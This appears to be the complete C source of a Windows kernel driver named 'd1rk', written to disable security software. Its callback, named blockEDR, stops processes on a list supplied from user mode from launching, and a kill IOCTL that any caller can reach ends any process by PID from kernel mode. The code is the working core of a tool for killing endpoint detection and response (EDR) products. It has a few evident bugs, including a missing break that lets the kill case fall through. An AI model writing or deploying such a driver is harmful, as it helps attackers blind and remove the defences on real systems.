#include <ntifs.h>

#define IOCTL_REGISTER_PCKC         CTL_CODE(0x8000, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KILL_PROC         CTL_CODE(0x8001, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define DRIVER_NAME "d1rk"

#define MAX_PROC_NAME_LEN 64
#define MAX_EDR_COUNT     64

typedef struct _PROC_BLOCK_LIST {
    ULONG Count;
    CHAR Names[MAX_EDR_COUNT][MAX_PROC_NAME_LEN];
} PROC_BLOCK_LIST;

PROC_BLOCK_LIST g_BlockList = { 0 };

VOID UnloadDriver(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS DriverCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS DriverDeviceIoControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);


// Process notify callback
void blockEDR(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(ProcessId);

    if (CreateInfo && CreateInfo->ImageFileName) {
        for (ULONG i = 0; i < g_BlockList.Count; i++) {
            ANSI_STRING targetAnsi;
            UNICODE_STRING targetUnicode;
            RtlInitAnsiString(&targetAnsi, g_BlockList.Names[i]);

            if (NT_SUCCESS(RtlAnsiStringToUnicodeString(&targetUnicode, &targetAnsi, TRUE))) {
                if (wcsstr(CreateInfo->ImageFileName->Buffer, targetUnicode.Buffer)) {
                    DbgPrintEx(0, 0, "[%s] Blocking creation of %ws\n", DRIVER_NAME, targetUnicode.Buffer);
                    CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
                    RtlFreeUnicodeString(&targetUnicode);
                    break;
                }
                RtlFreeUnicodeString(&targetUnicode);
            }
        }
    }
}

extern "C" {

    NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
    {

        UNREFERENCED_PARAMETER(RegistryPath);


        DriverObject->DriverUnload = UnloadDriver;
        DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverCreateClose;
        DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverCreateClose;
        DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDeviceIoControl;

        UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\d1rk");
        PDEVICE_OBJECT DeviceObject;
        NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);
        if (!NT_SUCCESS(status)) {
            DbgPrintEx(0, 0, "[%s] Failed to create device (0x%08X)\n", DRIVER_NAME, status);
            return status;
        }

        DeviceObject->Flags |= DO_BUFFERED_IO;

        UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\d1rk");
        status = IoCreateSymbolicLink(&symLink, &devName);
        if (!NT_SUCCESS(status)) {
            DbgPrintEx(0, 0, "[%s] Failed to create symbolic link (0x%08X)\n", DRIVER_NAME, status);
            IoDeleteDevice(DeviceObject);
            return status;
        }


        DbgPrintEx(0, 0, "[%s] Driver loaded!\n", DRIVER_NAME);


        return STATUS_SUCCESS;
    }
}

VOID UnloadDriver(_In_ PDRIVER_OBJECT DriverObject) {

    PsSetCreateProcessNotifyRoutineEx(blockEDR, TRUE);

    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\d1rk");
    IoDeleteSymbolicLink(&symLink);

    if (DriverObject->DeviceObject) {
        IoDeleteDevice(DriverObject->DeviceObject);
    }

    DbgPrintEx(0, 0, "[%s] Driver unloaded!\n", DRIVER_NAME);
}


_Use_decl_annotations_
NTSTATUS DriverCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}



_Use_decl_annotations_
NTSTATUS DriverDeviceIoControl(PDEVICE_OBJECT, PIRP Irp) {

    NTSTATUS status = STATUS_SUCCESS;
    PIO_STACK_LOCATION CurrentStackLocation = IoGetCurrentIrpStackLocation(Irp);


    switch (CurrentStackLocation->Parameters.DeviceIoControl.IoControlCode) {
    case IOCTL_REGISTER_PCKC:
    {
        
        if (CurrentStackLocation->Parameters.DeviceIoControl.InputBufferLength < sizeof(PROC_BLOCK_LIST)) {
            DbgPrintEx(0, 0, "[%s] Invalid buffer size!\n", DRIVER_NAME);
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }

        PROC_BLOCK_LIST* input = (PROC_BLOCK_LIST*)Irp->AssociatedIrp.SystemBuffer;
        RtlCopyMemory(&g_BlockList, input, sizeof(PROC_BLOCK_LIST));

        DbgPrintEx(0, 0, "[%s] Registered %lu blocked process names\n", DRIVER_NAME, g_BlockList.Count);

        status = PsSetCreateProcessNotifyRoutineEx(blockEDR, FALSE);
        if (!NT_SUCCESS(status)) {
            DbgPrintEx(0, 0, "[%s] Failed to register notify routine: 0x%08X\n", DRIVER_NAME, status);
        }

        break;

        break;

       

    }
    case IOCTL_KILL_PROC:
    {
        if (CurrentStackLocation->Parameters.DeviceIoControl.InputBufferLength < sizeof(ULONG)) {

            DbgPrintEx(0, 0, "[%s] Input buffer too small!\n", DRIVER_NAME);
            status = STATUS_BUFFER_TOO_SMALL;

        }

        ULONG pid = *(ULONG*)Irp->AssociatedIrp.SystemBuffer;
        if (pid != NULL) {

            HANDLE processHandle;
            OBJECT_ATTRIBUTES objectAttributes;
            CLIENT_ID clientId;

            clientId.UniqueProcess = (HANDLE)pid;
            clientId.UniqueThread = NULL;

            InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);

            status = ZwOpenProcess(&processHandle, 1u, &objectAttributes, &clientId);
            if (NT_SUCCESS(status)) {

                status = ZwTerminateProcess(processHandle, 0);
                ZwClose(processHandle);
                DbgPrintEx(0, 0, "[%s] process with PID: %u killed successfully\n", DRIVER_NAME, pid);

            }
            else {
                DbgPrintEx(0, 0, "Failed to open process with PID: %u, Status Code: %x\n", pid, status);
            }

        }
        else {
            status = STATUS_INVALID_PARAMETER;
        }

    }

    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}


